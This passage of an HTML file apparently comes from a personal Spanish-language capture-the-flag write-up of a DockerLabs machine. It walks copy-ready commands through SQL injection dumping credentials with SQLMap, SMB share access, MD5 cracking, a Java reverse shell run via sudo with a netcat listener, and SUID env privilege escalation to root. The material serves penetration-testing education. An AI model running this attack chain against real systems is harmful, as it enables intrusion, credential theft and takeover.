+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>available databases [5]:</div>
+        <div>[*] information_schema</div>
+        <div>[*] mysql</div>
+        <div>[*] performance_schema</div>
+        <div><span class="o-green">[*] register</span></div>
+        <div>[*] sys</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">LISTADO DE TABLAS EN LA DB "REGISTER"</span>
+      </div>
+      <div class="prose">
+        <p>
+          Especificamos la base de datos <span class="hl-cyan">register</span> con la flag
+          <span class="hl-cyan">-D</span> y le pedimos las tablas con <span class="hl-cyan">--tables</span>.
+          SQLMap devuelve una única tabla: <span class="hl">users</span>. Esta tabla es la que
+          almacena las credenciales del sistema.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register --tables">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">--tables</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Database: register</div>
+        <div>[1 table]</div>
+        <div>+---------+</div>
+        <div><span class="o-green">| users   |</span></div>
+        <div>+---------+</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">DUMP DE CREDENCIALES</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la flag <span class="hl-cyan">--dump</span> extraemos el contenido completo de la
+          tabla <span class="hl-cyan">users</span>. El resultado revela un único registro con las
+          credenciales en texto plano. Intentamos conectarnos via SSH con estas credenciales
+          pero el acceso fue denegado — el usuario <strong>dylan</strong> no tiene SSH habilitado
+          directamente o la contraseña es incorrecta para SSH.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register -T users --dump">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">-T</span> <span class="arg">users</span> <span class="flag">--dump</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Database: register | Table: users | [1 entry]</div>
+        <div>+------------------+----------+</div>
+        <div>| passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | username |</div>
+        <div>+------------------+----------+</div>
+        <div><span class="o-green">| KJSDFG789FGSDF78 | dylan    |</span></div>
+        <div>+------------------+----------+</div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">dylan</div></div>
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA</div><div class="cred-val">KJSDFG789FGSDF78</div></div>
+        <div class="cred-item"><div class="cred-label">FUENTE</div><div class="cred-val" style="color:var(--cyan)">DB register.users</div></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SMB -->
+    <div class="section" id="smb">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Enumeración SMB</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LISTADO DE RECURSOS COMPARTIDOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Dado que SSH no funcionó con las credenciales de dylan, enumeramos el servicio
+          <strong>SMB (Server Message Block)</strong> que Nmap detectó en los puertos 139 y 445.
+          Usamos <span class="hl-cyan">smbclient -L</span> con la flag <span class="hl-cyan">-N</span>
+          (null session, sin contraseña) para listar los recursos disponibles. Se identifican los
+          shares estándar (<em>print$, IPC$</em>) y uno personalizado: <span class="hl">shared</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="smbclient -L //172.17.0.2/ -N">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SMBCLIENT</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="flag">-L</span> <span class="arg">//172.17.0.2/</span> <span class="flag">-N</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;Comment</div>
+        <div>---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;-------</div>
+        <div>print$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;Printer Drivers</div>
+        <div><span class="o-green">shared&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk</span></div>
+        <div>IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC Service (439e83231dbd server)</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">ACCESO AL SHARE "SHARED" CON CREDENCIALES DE DYLAN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Nos conectamos al recurso compartido <span class="hl-cyan">shared</span> autenticándonos
+          como el usuario <strong>dylan</strong> con la contraseña obtenida vía SQLMap. Dentro del
+          share encontramos un archivo de texto: <span class="hl">augustus.txt</span>. Lo descargamos
+          a nuestra máquina con el comando <code style="color:var(--cyan)">get</code> de smbclient.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="smbclient //172.17.0.2/shared -U dylan">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SMBCLIENT</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="arg">//172.17.0.2/shared</span> <span class="flag">-U</span> <span class="arg">dylan</span></span></div>
+        <div><span class="cmd">Password: KJSDFG789FGSDF78</span></div>
+        <div><span class="prompt">smb: \&gt; </span><span class="cmd">dir</span></div>
+        <div><span class="prompt">smb: \&gt; </span><span class="cmd">get augustus.txt</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">getting file \augustus.txt of size 33</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">ANÁLISIS DEL CONTENIDO — HASH MD5</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al abrir <strong>augustus.txt</strong> encontramos una cadena de 32 caracteres hexadecimales:
+          <span class="hl-cyan">061fba5bdfc076bb7362616668de87c8</span>. La longitud y formato
+          corresponden a un hash <strong>MD5</strong>. Para obtener el texto original usamos
+          <span class="hl">CrackStation</span>, un servicio online que compara hashes contra
+          enormes diccionarios precomputados (rainbow tables).
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">061fba5bdfc076bb7362616668de87c8</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">CRACKEO DEL HASH — CRACKSTATION</span>
+      </div>
+      <div class="prose">
+        <p>
+          Introducimos el hash en <strong>CrackStation</strong> (crackstation.net). El servicio
+          identifica el tipo como <span class="hl-cyan">md5</span> y devuelve el resultado de
+          forma inmediata: <span class="hl">lovely</span>. Esta es la contraseña del usuario
+          <strong>augustus</strong> en el sistema.
+        </p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">augustus</div></div>
+        <div class="cred-item"><div class="cred-label">HASH (MD5)</div><div class="cred-val" style="color:var(--text-dim);font-size:0.75rem">061fba5bdfc076bb7362616668de87c8</div></div>
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA</div><div class="cred-val">lovely</div></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ACCESO SSH -->
+    <div class="section" id="acceso">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Acceso Inicial — SSH</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">CONEXIÓN SSH COMO AUGUSTUS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con las credenciales obtenidas nos conectamos via <strong>SSH</strong> al usuario
+          <span class="hl">augustus</span>. El acceso es exitoso. Una vez dentro, ejecutamos
+          <code style="color:var(--cyan)">sudo -l</code> para listar los comandos que augustus
+          puede ejecutar con privilegios elevados.
+        </p>
+        <p>
+          El sistema revela una entrada crítica: augustus puede ejecutar como el usuario
+          <span class="hl">dylan</span> el binario <span class="hl-cyan">/usr/bin/java</span>
+          sin necesidad de contraseña. Esto nos abre un vector de movimiento lateral hacia dylan.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh augustus@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">augustus@172.17.0.2</span></span></div>
+        <div><span class="cmd">augustus@172.17.0.2's password: lovely</span></div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">augustus@439e83231dbd:~$ </span><span class="cmd">sudo -l</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>User augustus may run the following commands on 439e83231dbd:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-yellow">(dylan) /usr/bin/java</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// MOVIMIENTO LATERAL NECESARIO</p>
+        <p>Augustus puede ejecutar <strong>/usr/bin/java</strong> como dylan. Esto significa que si compilamos y ejecutamos código Java malicioso, ese proceso correrá con la identidad de dylan. El plan: crear una <strong>reverse shell en Java</strong>, compilarla en /tmp, y ejecutarla con sudo -u dylan.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Escalada de Privilegios — dylan</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">GENERACIÓN DE REVERSE SHELL EN JAVA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Usamos el generador online <strong>revshells.com</strong> para obtener el código fuente
+          de una reverse shell en Java. Configuramos como IP la dirección de nuestra máquina atacante
+          (<span class="hl-cyan">172.17.0.1</span>) y como puerto <span class="hl">9001</span>.
+          El código generado crea una clase <code style="color:var(--cyan)">shell</code> que al
+          ejecutarse abre una conexión TCP hacia nuestra máquina y lanza una bash interactiva.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">LISTENER EN NUESTRA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de ejecutar el payload, ponemos <strong>netcat</strong> a escuchar en el puerto
+          <span class="hl">9001</span> para recibir la conexión entrante de la reverse shell.
+          Es fundamental iniciar el listener <em>antes</em> de ejecutar el código Java.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 9001">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NETCAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">9001</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] 9001 ...</div>
+        <div><span class="o-green">connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41330</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">CREACIÓN Y COMPILACIÓN DEL PAYLOAD</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde la sesión SSH de augustus, nos movemos al directorio
+          <span class="hl-cyan">/tmp</span> (escribible por todos los usuarios) y creamos el archivo
+          <strong>shell.java</strong> con el código de la reverse shell. Luego lo compilamos con
+          <span class="hl-cyan">javac</span>, lo que genera el bytecode <code style="color:var(--cyan)">shell.class</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /tmp && nano shell.java">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH — AUGUSTUS</span>
+        <div><span class="prompt">augustus@...:~$ </span><span class="cmd">cd /tmp</span></div>
+        <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">nano shell.java</span></div>
+        <div class="comment">&nbsp;&nbsp;&nbsp;&nbsp;# pegar el código de la reverse shell</div>
+        <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">ls</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>hsperfdata_root&nbsp;&nbsp;<span class="o-green">shell.java</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">COMPILACIÓN CON JAVAC</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="javac shell.java">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">JAVAC</span>
+        <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">javac <span class="arg">shell.java</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green"># genera shell.class (bytecode Java listo para ejecutar)</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">EJECUCIÓN COMO DYLAN — MOVIMIENTO LATERAL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el payload Java usando el permiso <span class="hl">sudo -u dylan</span>.
+          La flag <span class="hl-cyan">-cp /tmp</span> indica el classpath (directorio donde
+          está <code style="color:var(--cyan)">shell.class</code>) y <code style="color:var(--cyan)">shell</code>
+          es el nombre de la clase a ejecutar. El proceso corre como dylan y la reverse shell
+          conecta con nuestro listener de netcat, otorgándonos una shell interactiva como dylan.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -u dylan /usr/bin/java -cp /tmp shell">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SUDO — JAVA</span>
+        <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">sudo <span class="flag">-u</span> <span class="arg">dylan</span> /usr/bin/java <span class="flag">-cp</span> <span class="arg">/tmp</span> shell</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green"># En el listener de netcat recibimos la shell de dylan:</span></div>
+        <div><span class="o-cyan">dylan@d7089f8d667f:/tmp$</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">BÚSQUEDA DE BINARIOS SUID</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ahora como dylan, buscamos binarios con el bit <strong>SUID</strong> activado usando
+          <span class="hl-cyan">find</span>. Los binarios SUID se ejecutan con los permisos de
+          su propietario (generalmente root) sin importar quién los invoque. Entre los resultados
+          encontramos <span class="hl">/usr/bin/env</span>, que está listado en
+          <strong>GTFOBins</strong> como explotable para escalar privilegios.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND SUID</span>
+        <div><span class="prompt">dylan@...:/tmp$ </span><span class="cmd">find / <span class="flag">-perm -4000</span> <span class="arg">2&gt;/dev/null</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+        <div>/usr/lib/openssh/ssh-keysign</div>
+        <div>/usr/bin/su | /usr/bin/chfn | /usr/bin/newgrp</div>
+        <div>/usr/bin/mount | /usr/bin/umount | /usr/bin/passwd</div>
+        <div><span class="o-red">/usr/bin/env</span></div>
+        <div>/usr/bin/chsh | /usr/bin/sudo</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ROOT -->
+    <div class="section" id="root">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Root</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">GTFOBINS — EXPLOTACIÓN DE /usr/bin/env</span>
+      </div>
+      <div class="prose">
+        <p>
+          Consultamos <strong>GTFOBins</strong> (gtfobins.github.io) para obtener el payload
+          correcto para <span class="hl-cyan">/usr/bin/env</span> con SUID. GTFOBins explica que
+          cuando <code style="color:var(--cyan)">env</code> tiene el bit SUID activo, puede
+          spawner una shell heredando los privilegios elevados del propietario del binario (root),
+          siempre que se use la flag <span class="hl-cyan">-p</span> para evitar que el shell
+          descarte los privilegios efectivos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">21</div>
+        <span class="step-title">EXPLOTACIÓN SUID — OBTENEMOS ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el comando de GTFOBins. La flag <span class="hl-cyan">-p</span> de
+          <code style="color:var(--cyan)">/bin/sh</code> indica que se preserve el
+          <em>effective UID</em> (eUID = 0 = root) sin resetearlo al real UID del usuario que
+          lo invoca. El comando <strong>whoami</strong> confirma que somos <span class="hl">root</span>.
+          Máquina comprometida.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/usr/bin/env /bin/sh -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC → ROOT</span>
+        <div><span class="prompt">dylan@...:/tmp$ </span><span class="cmd">/usr/bin/env /bin/sh <span class="flag">-p</span></span></div>
+        <div><span class="prompt"># </span><span class="cmd">whoami</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red" style="font-size:1rem;font-weight:bold;">root</span></div>
+      </div>
+
+      <div style="border: 1px solid var(--green); background: rgba(0,255,136,0.04); padding: 2rem; margin-top: 2rem; text-align: center;">
+        <div style="font-family: var(--font-disp); font-size: 1.8rem; color: var(--green); letter-spacing: 4px; text-shadow: 0 0 20px rgba(0,255,136,0.5);">✓ PWNED</div>
+        <div style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 2px;">MÁQUINA DATABASE — DOCKERLABS — COMPLETADA</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA DE COMANDOS -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>Descripción detallada de cada herramienta y comando utilizado en este writeup.</p>
+      </div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt;</div>
+          <p class="cmd-ref-desc">Escáner de redes y puertos. Permite descubrir qué puertos TCP/UDP están abiertos en un host y qué servicios (versión, OS, scripts) corren en ellos.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → escanea los 65535 puertos TCP</li>
+            <li><span>-sS</span> → SYN scan (sigiloso, no completa el handshake)</li>
+            <li><span>-sC</span> → ejecuta scripts NSE por defecto</li>
+            <li><span>-sV</span> → detecta versión de servicios</li>
+            <li><span>-n</span> → sin resolución DNS (más rápido)</li>
+            <li><span>-Pn</span> → skip host discovery (trata el host como activo)</li>
+            <li><span>--min-rate=5000</span> → mínimo 5000 paquetes/segundo</li>
+            <li><span>--open</span> → muestra solo puertos abiertos</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">SQLMap</div>
+          <div class="cmd-ref-syntax">sqlmap -r request.txt [opciones]</div>
+          <p class="cmd-ref-desc">Herramienta automática de detección y explotación de inyecciones SQL. Soporta múltiples técnicas (boolean-based, time-based, UNION, etc.) y permite extraer el contenido completo de bases de datos.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-r request.txt</span> → lee la petición HTTP desde archivo</li>
+            <li><span>--dbs</span> → enumera todas las bases de datos</li>
+            <li><span>-D &lt;db&gt;</span> → selecciona una base de datos</li>
+            <li><span>--tables</span> → lista las tablas de la DB seleccionada</li>
+            <li><span>-T &lt;tabla&gt;</span> → selecciona una tabla</li>
+            <li><span>--dump</span> → extrae (vuelca) el contenido de la tabla</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">smbclient</div>
+          <div class="cmd-ref-syntax">smbclient //IP/share -U usuario</div>
+          <p class="cmd-ref-desc">Cliente de línea de comandos para el protocolo SMB/CIFS. Permite listar recursos compartidos de red, conectarse a ellos, navegar directorios y transferir archivos, de forma similar a un cliente FTP.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-L //IP/</span> → lista todos los shares disponibles</li>
+            <li><span>-N</span> → null session (sin autenticación)</li>
+            <li><span>-U usuario</span> → especifica el usuario a autenticar</li>
+            <li><span>dir</span> → (dentro del cliente) lista archivos</li>
+            <li><span>get archivo</span> → descarga un archivo al local</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Netcat (nc)</div>
+          <div class="cmd-ref-syntax">nc -lvnp &lt;puerto&gt;</div>
+          <p class="cmd-ref-desc">Utilidad de red multipropósito conocida como "la navaja suiza de TCP/IP". En pentesting se usa principalmente para establecer listeners que reciben conexiones de reverse shells.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → modo escucha (listener)</li>
+            <li><span>-v</span> → verbose (muestra info de conexiones)</li>
+            <li><span>-n</span> → sin resolución DNS</li>
+            <li><span>-p 9001</span> → puerto a escuchar</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">javac / java</div>
+          <div class="cmd-ref-syntax">javac shell.java → java -cp /tmp shell</div>
+          <p class="cmd-ref-desc"><strong>javac</strong> es el compilador de Java: transforma código fuente (.java) en bytecode (.class) ejecutable por la JVM. <strong>java</strong> ejecuta el bytecode compilado. Usados juntos permiten ejecutar un payload Java arbitrario.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>javac shell.java</span> → compila y genera shell.class</li>
+            <li><span>-cp /tmp</span> → classpath: directorio donde buscar .class</li>
+            <li><span>shell</span> → nombre de la clase principal a ejecutar</li>
+            <li><span>sudo -u dylan</span> → ejecuta el proceso como dylan</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">find (SUID)</div>
+          <div class="cmd-ref-syntax">find / -perm -4000 2>/dev/null</div>
+          <p class="cmd-ref-desc">El comando <strong>find</strong> busca archivos por criterios. Con <code>-perm -4000</code> localiza todos los binarios con el bit SUID activo — archivos que se ejecutan con los permisos de su propietario, frecuentemente root.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>/</span> → busca desde la raíz del sistema</li>
+            <li><span>-perm -4000</span> → bit SUID activo (4 = SUID)</li>
+            <li><span>2&gt;/dev/null</span> → descarta errores de "permission denied"</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">/usr/bin/env (SUID)</div>
+          <div class="cmd-ref-syntax">/usr/bin/env /bin/sh -p</div>
+          <p class="cmd-ref-desc"><strong>env</strong> es un binario que ejecuta programas en un entorno modificado. Cuando tiene el bit SUID activo (propietario root), puede ser abusado para spawnear una shell con privilegios efectivos de root sin necesidad de contraseña.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>SUID</span> → el proceso hereda el eUID del propietario (root)</li>
+            <li><span>/bin/sh</span> → shell a ejecutar</li>
+            <li><span>-p</span> → preserve privileges: no descarta el eUID=0</li>
+            <li><span>GTFOBins</span> → referencia: gtfobins.github.io/gtfobins/env/</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sudo -l / sudo -u</div>
+          <div class="cmd-ref-syntax">sudo -l · sudo -u usuario comando</div>
+          <p class="cmd-ref-desc"><strong>sudo</strong> permite ejecutar comandos como otro usuario (por defecto root). <code>-l</code> lista qué comandos puede ejecutar el usuario actual. <code>-u usuario</code> especifica como qué usuario ejecutar — clave para el movimiento lateral de augustus a dylan.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → lista permisos sudo del usuario actual</li>
+            <li><span>-u dylan</span> → ejecuta el siguiente comando como dylan</li>
+            <li><span>(dylan) NOPASSWD:</span> → sin contraseña requerida</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
